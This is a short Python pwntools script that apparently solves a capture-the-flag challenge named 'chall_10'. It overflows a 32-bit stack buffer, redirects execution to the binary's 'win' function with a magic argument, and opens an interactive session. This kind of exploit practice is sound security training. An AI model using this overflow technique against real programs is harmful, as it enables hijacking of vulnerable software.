from pwn import *
p=process("./chall_10")
elf=ELF("./chall_10")
payload = b"A"*(0x308 + 4) + p32(elf.sym.win) + b"JUNK" + p32(0x1a55fac3)
p.sendline(payload)
p.interactive()
